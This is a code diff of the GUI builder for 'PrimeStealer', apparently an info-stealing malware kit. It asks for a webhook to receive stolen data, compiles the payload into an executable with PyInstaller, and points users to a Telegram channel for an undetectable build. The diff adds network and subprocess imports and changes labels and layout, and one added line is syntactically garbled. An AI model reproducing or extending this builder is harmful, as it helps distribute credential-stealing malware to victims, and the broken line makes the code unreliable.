@@ -1,13 +1,14 @@
 import os
 import shutil
+import requests
+import subprocess
 import customtkinter as ctk
 from tkinter import messagebox, filedialog
 
 ctk.set_appearance_mode("dark")
-app = ctk.CTk()
-app.title(f"t.me/PrimeStealer | Builder by PrimeStealer")
+app = ctk.CTk()"img\\prime.ico")
 app.iconbitmap("img\\prime.ico")
-app.geometry("400x240")
+app.geometry("580x300")
 app.resizable(False, False)
 
 app.update_idletasks()
@@ -59,7 +60,7 @@ def build_exe():
         else:
             icon_option = ''
 
-        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - t.me/PrimeStealer"
+        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel t.me/PrimeStealer"
         messagebox.showinfo("Information", message)
 
         # Customizing PyInstaller build command
@@ -71,7 +72,8 @@ def build_exe():
     else:
         messagebox.showerror("Error", "Invalid webhook URL!")
 
-label = ctk.CTkLabel(master=app, text="PrimeStealer", text_color=("white"), font=("Arial bold", 26))
+
+label = ctk.CTkLabel(master=app, text="Prime Stealer", text_color=("white"), font=("Arial bold", 26))
 label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)
 
 entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
